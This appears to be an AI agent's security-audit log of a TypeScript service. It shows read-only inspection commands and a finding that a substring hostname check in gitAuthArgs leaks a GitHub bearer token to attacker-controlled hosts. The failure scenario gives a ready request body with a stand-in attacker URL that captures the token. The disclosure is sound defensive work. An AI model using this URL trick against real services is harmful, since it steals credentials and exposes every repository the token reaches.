input.command: ls; ls src; cat -n src/git-auth.ts; cat -n src/worktree.ts
input.description: List files and show the two source files

input.command: grep -rn "remoteUrl\|cloneRepo\|SERVICE_TOKEN\|github" src; cat -n src/config.ts; git status --short; git log --oneline | head

input.reason: In src/git-auth.ts:8, `gitAuthArgs` decides whether to attach the service token with `remoteUrl.includes("github.com")`. That is a substring test, not a check of the parsed hostname. URLs such as `https://github.com.evil.example/x.git` or `https://evil.example/github.com/x.git` pass it, and the function returns `-c http.extraHeader=Authorization: Bearer <token>`. In src/worktree.ts:15, `cloneRepo` passes that header together with SERVICE_TOKEN (HARBOR_GITHUB_TOKEN, from src/config.ts:4) to `git clone` for the same URL. Git then sends the header to whatever host the URL names. The URL comes from user input: in src/routes.ts:19-22, `registerRepo` takes `remoteUrl` from `req.body`, checks only that it is non-empty, and calls `cloneRepo` with it. No code on this path parses the URL or allowlists the host. Both member locations are real parts of this one defect.
input.failure_scenario: An authenticated user calls registerRepo with body {id: "x", remoteUrl: "https://github.com.attacker.example/r.git"}. The route checks only that remoteUrl is non-empty and calls cloneRepo. gitAuthArgs sees the "github.com" substring and returns the bearer header. `git clone` then sends its HTTP request to github.com.attacker.example with `Authorization: Bearer <HARBOR_GITHUB_TOKEN>`. The attacker's server logs the header and now holds the service's GitHub token.
input.severity_reason: This is a secret leak that any user who can register a repository can exploit. It needs one request with a URL of the attacker's choosing, and it exposes the service-wide GitHub token, which gives access to every repository that token can reach.
